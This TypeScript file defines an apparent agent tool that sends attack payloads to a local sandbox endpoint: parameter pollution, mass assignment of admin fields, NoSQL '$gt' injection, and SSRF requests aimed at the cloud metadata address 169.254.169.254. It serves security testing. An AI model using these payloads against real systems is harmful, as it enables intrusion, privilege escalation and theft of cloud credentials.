import type { Tool } from "../tool-service";

export const trafficPoisonerTool: Tool = {
  name: "traffic_poison",
  description:
    "Simulates advanced application-logic attacks (Context-Aware attacks) like HTTP Parameter Pollution, Mass Assignment, or NoSQL injections against a local sandbox. Goes beyond simple fuzzing.",
  parameters: {
    type: "object",
    properties: {
      url: {
        type: "string",
        description: "The local endpoint to poison (e.g., 'http://127.0.0.1:4000/api/users').",
      },
      attackType: {
        type: "string",
        description: "The attack vector to simulate: 'PARAMETER_POLLUTION', 'MASS_ASSIGNMENT', 'NOSQL_INJECTION', 'SSRF'.",
      },
      basePayload: {
        type: "string",
        description: "A valid expected JSON payload (as a string) to mutate (e.g. '{\"username\":\"admin\"}').",
      },
    },
    required: ["url", "attackType"],
  },
  async execute(args, _context) {
    const { url, attackType, basePayload } = args;

    if (!url.includes("127.0.0.1") && !url.includes("localhost")) {
      return "Traffic Poisoner Error: External targeting is absolutely PROHIBITED. Must be localhost.";
    }

    let parsedPayload: Record<string, any> = {};
    if (basePayload) {
      try {
        parsedPayload = JSON.parse(basePayload);
      } catch (e) {
        return "Traffic Poisoner Error: basePayload must be valid JSON.";
      }
    }

    // Build the malicious payload
    let maliciousUrl = url;
    let maliciousBody: Record<string, any> = { ...parsedPayload };

    switch (attackType) {
      case "PARAMETER_POLLUTION":
        // e.g., ?id=1&id=2&id=SELECT
        maliciousUrl = url.includes("?") 
          ? `${url}&id=1&id=2&id=injection`
          : `${url}?id=1&id=2&id=injection`;
        break;
      case "MASS_ASSIGNMENT":
        maliciousBody = {
          ...maliciousBody,
          isAdmin: true,
          role: "admin",
          permissions: "*",
        };
        break;
      case "NOSQL_INJECTION":
        // e.g. {"username": {"$gt": ""}}
        for (const key in maliciousBody) {
          maliciousBody[key] = { "$gt": "" };
        }
        break;
      case "SSRF":
        maliciousBody = {
          ...maliciousBody,
          url: "http://169.254.169.254/latest/meta-data/",
          webhook: "http://127.0.0.1:22",
        };
        break;
      default:
        return `Unknown attack type: ${attackType}`;
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);

      const response = await fetch(maliciousUrl, {
        method: "POST", // Standardize on POST for body poisoning validation
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(maliciousBody),
        signal: controller.signal,
      });

      clearTimeout(timeout);
      
      const respText = await response.text();

      let result = `Traffic Poisoner [${attackType}] Report\\n=========================================\\n`;
      result += `Target: POST ${maliciousUrl}\\n`;
      result += `Mutated Body Sent: ${JSON.stringify(maliciousBody)}\\n\\n`;
      
      if (response.status >= 500) {
        result += `[SUCCESS/CRASH] Target returned ${response.status}. The attack successfully crashed or disrupted the application!\\n`;
      } else if (response.status === 200 || response.status === 201) {
        result += `[WARNING] Target returned ${response.status}. Mass Assignment or NoSQL hook may have been accepted silently! Review the sandbox logs.\\n`;
      } else {
        result += `[DEFENDED] Target returned ${response.status}. Attack appeared to be handled safely or rejected.\\n`;
      }

      result += `\\nResponse snippet: ${respText.slice(0, 300)}`;
      return result;

    } catch (error) {
      return `Traffic Poisoner connection failed: ${(error as Error).message}. (Is the sandbox_run actually running?)`;
    }
  },
};
